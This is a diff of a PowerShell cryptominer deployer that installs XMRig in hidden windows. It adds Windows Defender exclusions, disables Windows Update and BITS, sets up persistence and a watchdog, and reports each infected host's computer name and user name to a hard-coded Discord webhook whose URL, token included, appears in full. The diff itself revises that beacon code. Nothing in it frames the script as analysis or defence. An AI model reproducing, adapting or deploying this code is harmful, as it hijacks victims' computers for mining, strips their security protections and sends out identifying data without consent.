@@ -38,7 +38,7 @@ function Install-Miner {
     Start-Sleep -Seconds 3
     New-Item -ItemType Directory -Path "$installDir" -Force | Out-Null
 
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
+    [Net.ServicePointManager]::SecurityProtocol = 3072
 
     $downloaded = $false
     try {
@@ -224,21 +224,28 @@ function Disable-Sleep {
 function Send-DiscordWebhook {
     $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
-        $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" }
-        $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Live! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
-        Invoke-RestMethod $webhookUrl -Headers $headers -Method Post -Body $payload -ContentType "application/json" | Out-Null
+        [Net.ServicePointManager]::SecurityProtocol = 3072
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Content-Type", "application/json")
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $msg = "⚡ **Miner Live** | Host: $env:COMPUTERNAME | User: $env:USERNAME"
+        $payload = "{`"content`":`"$msg`"}"
+        $wc.UploadString($webhookUrl, "POST", $payload) | Out-Null
+        Start-Sleep -Seconds 3
     } catch {}
 }
 
 try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
+    [Net.ServicePointManager]::SecurityProtocol = 3072
     Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue
     try { & sc.exe config wuauserv start= disabled >$null 2>&1; & sc.exe stop wuauserv >$null 2>&1; & sc.exe config bits start= disabled >$null 2>&1; & sc.exe stop bits >$null 2>&1 } catch {}
+    
     Disable-Sleep; Enable-HugePages
     Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
     Start-Process "$xmrigExe" -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
     Start-Sleep -Seconds 4
     Start-Process "wscript.exe" -ArgumentList "`"$watchdogVbs`"" -WindowStyle Hidden
     Send-DiscordWebhook
+    Start-Sleep -Seconds 3
     Write-Host "[+] Pro Deploy Success."
 } catch { Write-Host "[-] Error: $_" }
